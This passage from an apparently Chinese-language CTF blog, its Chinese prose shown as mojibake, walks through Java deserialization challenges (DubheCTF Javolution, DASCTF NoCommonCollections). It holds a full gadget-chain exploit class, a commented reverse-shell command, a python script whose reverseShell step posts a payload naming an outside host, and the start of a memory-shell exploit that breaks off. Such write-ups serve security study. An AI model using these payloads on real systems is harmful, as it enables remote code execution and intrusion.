class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.dubhe.javolution.pool.PalDataSource;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.sql.DataSource;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span><br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-comment">//String command = &quot;bash -c &#123;echo,&lt;base64åå¼¹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;;</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;calc&quot;</span>;<br>        <span class="hljs-type">PalDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PalDataSource</span>();<br>        dataSource.setBROWSER(command);<br>        dataSource.setLOGMECH(<span class="hljs-string">&quot;BROWSER&quot;</span>);<br>        dataSource.setDSName(<span class="hljs-string">&quot;vps&quot;</span>);<br>        dataSource.setDbsPort(<span class="hljs-string">&quot;10250&quot;</span>);<br>        dataSource.setBROWSER_TIMEOUT(<span class="hljs-string">&quot;2&quot;</span>);<br>        dataSource.getConnection();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> getProxy(dataSource, DataSource.class);<br><span class="hljs-comment">//        Object exp = getBadAttr(proxy);</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> getXstringMap(proxy);<br>        base64Serialize(exp);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">(Object obj,Class&lt;?&gt; clazz)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(obj);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;clazz&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getBadAttr</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(writeReplace);<br>        ctClass.toClass();<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(obj);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, node);<br>        <span class="hljs-keyword">return</span> val;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getXstringMap</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(writeReplace);<br>        ctClass.toClass();<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(obj);<br><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map1.put(<span class="hljs-string">&quot;yy&quot;</span>, node);<br>        map1.put(<span class="hljs-string">&quot;zZ&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;yy&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, node);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> makeMap(map1, map2);<br><br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">makeMap</span><span class="hljs-params">(Object v1, Object v2)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">base64Serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        oos.writeObject(obj);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        System.out.println(payload);<br>        <span class="hljs-keyword">return</span> payload;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        Class&lt;?&gt; clazz = obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923204554413.png" alt="image-20240923204554413"></p><p>å…¶å®è¿˜å¯ä»¥æ‰“Eventlistenerlistçš„é“¾å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeReadObjectToStringTrigger</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>    <span class="hljs-type">UndoManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>    <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) ReflectionHelper.getFieldValue(manager, <span class="hljs-string">&quot;edits&quot;</span>);<br>    vector.add(obj);<br>    ReflectionHelper.setFieldValue(list, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, manager&#125;);<br>    <span class="hljs-keyword">return</span> list;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸€æŠŠæ¢­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>payload = <span class="hljs-string">&quot;rO0ABXNyABFq......&quot;</span><br><br>baseUrl = <span class="hljs-string">&quot;xxxxxx&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">battle</span>(<span class="hljs-params">boss</span>):<br>    res = requests.get(baseUrl + <span class="hljs-string">f&quot;/pal/battle/<span class="hljs-subst">&#123;boss&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(res.text)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cheat</span>():<br>    res = requests.get(baseUrl + <span class="hljs-string">&quot;/pal/cheat?defense=-2147483648&quot;</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    res = requests.get(baseUrl + <span class="hljs-string">&quot;/pal/show&quot;</span>)<br>    <span class="hljs-built_in">print</span>(res.text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverseShell</span>():<br>    res = requests.post(baseUrl + <span class="hljs-string">&quot;/pal/cheat&quot;</span>, data=&#123;<span class="hljs-string">&quot;host&quot;</span>: <span class="hljs-string">&quot;dubhe.sudo.cc&quot;</span>, <span class="hljs-string">&quot;data&quot;</span>: payload&#125;)<br>    <span class="hljs-built_in">print</span>(res.text)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    cheat()<br>    show()<br>    battle(<span class="hljs-string">&quot;Jetragon&quot;</span>)<br>    show()<br>    reverseShell()<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923164051417.png" alt="image-20240923164051417"></p><p>å‚è€ƒï¼š</p><p><a href="https://h4cking2thegate.github.io/posts/42795/#%E5%AE%8C%E6%95%B4exp">Javolution å‡ºé¢˜å°è®° | H4cking to the Gate . (h4cking2thegate.github.io)</a></p><p><a href="https://pankas.top/2024/03/19/dubhectf%E5%9D%90%E7%89%A2%E8%AE%B0%E5%BD%95/#%E9%A2%98%E8%A7%A3">DubheCTFåç‰¢è®°å½• (pankas.top)</a></p><p><a href="https://zer0peach.github.io/2024/03/18/Javolution/#%E9%87%8D%E5%A4%B4%E6%88%8F">Javolution - Zer0peach canâ€™t think</a></p><p><a href="https://blog.s1um4i.com/2024-DubheCTF/">2024 XCTF è”èµ› DubheCTF éƒ¨åˆ†é¢˜è§£ - S1uM4i</a></p><p><a href="https://i.blackhat.com/Asia-23/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf">AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf (blackhat.com)</a></p><p><a href="https://github.com/luelueking/Deserial_Sink_With_JDBC">luelueking&#x2F;Deserial_Sink_With_JDBC: Some ReadObject Sink With JDBC (github.com)</a></p><p>[DubheCTF 2024 Web Writeup - Boogiepop Doesnâ€™t Laugh (boogipop.com)](<a href="https://boogipop.com/2024/03/19/DubheCTF">https://boogipop.com/2024/03/19/DubheCTF</a> 2024 Web Writeup&#x2F;#Javolution)</p><h2 id="DASCTF-X-HDCTF-2024-NoCommonCollections"><a href="#DASCTF-X-HDCTF-2024-NoCommonCollections" class="headerlink" title="DASCTF X HDCTF 2024 - NoCommonCollections"></a>DASCTF X HDCTF 2024 - NoCommonCollections</h2><p>å®˜æ–¹wp:<a href="https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/ksfsfw8yf1u2xhhq#xwxbK">DASCTF X HDCTF 2024 å®˜æ–¹WP (yuque.com)</a></p><p>å¤ç°è¿™é“é¢˜ä¸»è¦æ˜¯ä¸ºäº†å·©å›ºJRMPå’Œå†…å­˜é©¬ã€‚</p><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç»™äº†ä¸¤ä¸ªjarï¼Œä¸€ä¸ªé¢˜ç›®é€»è¾‘ï¼ŒåŒæ—¶ä¸Šäº†ä¸€ä¸ªRASPé€šé˜²ã€‚</p><p>å€Ÿé‰´äº†å®˜ç½‘çš„wpï¼Œåˆ†æä¸€ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8081</span>;<br>    <span class="hljs-type">HttpServer</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> HttpServer.create(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(port), <span class="hljs-number">0</span>);<br>    server.createContext(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyHandler</span>());<br>    server.setExecutor((Executor)<span class="hljs-literal">null</span>);<br>    server.start();<br>    System.out.println(<span class="hljs-string">&quot;Server is listening on port &quot;</span> + port);<br>&#125;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpHandler</span> &#123;<br>    MyHandler() &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpExchange exchange)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">requestBody</span> <span class="hljs-operator">=</span> exchange.getRequestBody();<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br><br>            <span class="hljs-type">int</span> nRead;<br>            <span class="hljs-keyword">while</span>((nRead = requestBody.read(data, <span class="hljs-number">0</span>, data.length)) != -<span class="hljs-number">1</span>) &#123;<br>                buffer.write(data, <span class="hljs-number">0</span>, nRead);<br>            &#125;<br><br>            buffer.flush();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base64Param</span> <span class="hljs-operator">=</span> buffer.toString();<br>            SerializeUtil.base64deserial(base64Param);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Data received successfully&quot;</span>;<br>            exchange.sendResponseHeaders(<span class="hljs-number">200</span>, (<span class="hljs-type">long</span>)response.length());<br>            <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> exchange.getResponseBody();<br>            os.write(response.getBytes());<br>            os.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Error&quot;</span>;<br>            exchange.sendResponseHeaders(<span class="hljs-number">200</span>, (<span class="hljs-type">long</span>)response.length());<br>            <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> exchange.getResponseBody();<br>            os.write(response.getBytes());<br>            os.close();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¾ˆæ˜¾ç„¶çš„ååºåˆ—åŒ–å…¥å£ï¼Œåªéœ€è¦postä¼ å‚æ•°æ®å®ƒè‡ªå·±å°±ä¼šæ¥æ”¶ï¼Œæ˜¾ç¤ºç»“æœã€‚</p><p>å®ƒè¿˜é‡å†™äº†ObjectInputStreamï¼Œçœ‹ä¸€çœ‹ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240927185452840.png" alt="image-20240927185452840"></p><p>å¦‚é¢˜ç›®æ‰€ç¤ºï¼ŒçœŸæ˜¯NoCommonsColletctionsã€‚</p><p>æ¯”è¾ƒä¼ ç»Ÿçš„ä¸€äº›è¿‡æ»¤ï¼Œé¢˜ç›®åªç»™äº†CCä¾èµ–æ²¡æœ‰ç»™å…¶ä»–çš„ä¸œè¥¿ï¼Œä½†æ˜¯ccä¸‹çš„ç±»åˆè¢«é»‘åå•è¿‡æ»¤äº†ï¼Œè¿™ç§æƒ…å†µä¸‹ç”±äºæ²¡æ³•è§¦å‘getterï¼Œä½ ä¸èƒ½ä½¿ç”¨<code>SignObject</code>äºŒæ¬¡ååºåˆ—åŒ–ï¼Œè¿™é‡Œå°±è¯¥ä½¿ç”¨YsoSerialçš„JRMPæœåŠ¡å»æ”»å‡»äº†ã€‚</p><p>ä½†æ˜¯è¿™ä¸€é¢˜è¿˜æœ‰ä¸ªç‚¹ä½å°±æ˜¯æœ‰ä¸ªRasp Hookäº†<code>Runtime</code>å’Œ<code>ProcessBuilder</code>æ–¹æ³•ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240927185744753.png" alt="image-20240927185744753"></p><p>å› æ­¤è¿™ä¸€é¢˜æˆ‘ä»¬è¿˜éœ€è¦åå°„è°ƒç”¨nativeçš„<code>forandexec</code>æ–¹æ³•å»å‘½ä»¤æ‰§è¡Œï¼Œå¹¶ä¸”éœ€è¦è‡ªå·±å®ç°ä¸€ä¸ª<code>JRMPListner</code>ã€‚</p><h3 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h3><p>è¿™é‡Œé‡‡ç”¨çš„æ˜¯æ‰“å…¥ä¸€ä¸ªå†…å­˜é©¬ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.boogipop.Solutions;<br><br><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpExchange;<br><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpHandler;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> 